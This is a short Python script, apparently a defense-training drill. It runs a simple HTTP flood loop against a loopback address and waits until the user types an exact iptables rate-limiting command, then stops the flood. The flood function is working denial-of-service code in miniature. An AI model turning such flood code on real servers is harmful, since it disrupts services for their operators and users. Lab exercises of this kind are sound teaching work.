import threading
import time
import socket

http_flood_active = True

def launch_http_flood(target_ip, target_port):
    global http_flood_active
    print(f"Launching HTTP Flood attack on {target_ip}:{target_port}...")
    
    try:
        while http_flood_active:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target_ip, target_port))
                request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
                s.send(request.encode())
                s.close()
            except:
                pass
            
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("HTTP Flood attack stopped.")

def wait_for_user_defense():
    global http_flood_active
    print("HTTP Flood attack started. Defend by limiting HTTP requests.")
    print("command: sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 100/minute -j ACCEPT")
    
    while True:
        user_input = input("Enter your command: ").strip()
        if user_input == "sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 100/minute -j ACCEPT":
            print("HTTP Flood attack stopped.")
            http_flood_active = False
            return True
        else:
            print("Incorrect command. Try again.")

def main():
    target_ip = "127.0.0.2"
    target_port = 4000

    http_flood_thread = threading.Thread(target=launch_http_flood, args=(target_ip, target_port))
    http_flood_thread.start()

    if wait_for_user_defense():
        http_flood_thread.join()
        print("HTTP Flood attack successfully defended.")

if __name__ == "__main__":
    main()